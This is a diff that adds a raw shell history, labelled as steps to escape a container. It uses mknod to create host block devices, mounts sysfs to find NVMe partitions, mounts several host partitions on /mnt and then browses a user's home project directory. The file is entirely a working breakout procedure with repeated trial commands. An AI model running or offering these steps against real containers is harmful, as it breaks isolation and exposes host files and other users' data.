@@ -1,0 +1,69 @@
+steps to come out from container 
+  1 ls
+   2 cd /dev
+   3 ls
+   4 mknod --help
+   5 mknod disk b 259 2
+   6 ls
+   7 mount disk /mnt
+   8 ls -l
+   9 mount /dev/disk /mnt
+  10 rm disk
+  11 mount -t sysfs sys /sys
+  12 cd /sys
+  13 ls
+  14 cd block/
+  15 ls
+  16 cd nvme0n1/
+  17 ls
+  18 cd nvme0n1p2/
+  19 ls
+  20 cat dev
+  21 cd /
+  22 umount /sys
+  23 cd /dev
+  24 ls
+  25 mknod --help
+  26 mknod disk b 259 2
+  27 mount disk /mnt
+  28 strace
+  29 ls -l
+  30 cd /mnt
+  31 ls
+  32 cd ..
+  33 mount 
+  34 mount /dev/disk /mnt
+  35 cd /proc
+  36 ls
+  37 cat cgroups 
+  38 cd 1
+  39 cat cgroup 
+  40 cd /dev
+  41 ls -l
+  42 rm disk
+  43 mknod disk b 259 1
+  44 mount disk /mnt
+  45 cd /mnt
+  46 ls
+  47 cd ..
+  48 umount mnt
+  49 cd /dec
+  50 cd /dev
+  51 ls
+  52 rm disk 
+  53 mknod disk b 259 5
+  54 mount disk /mnt
+  55 cd /mnt
+  56 ls
+  57 cd home/abirman/projects/maniso/
+  58 ls
+  59 cd root/
+  60 ls
+  61 cd mnt/
+  62 ls
+  63 cd /
+  64 umount /mnt
+  65 ls /mnt
+  66 cd /dev
+  67 ls
+  68 rm disk 
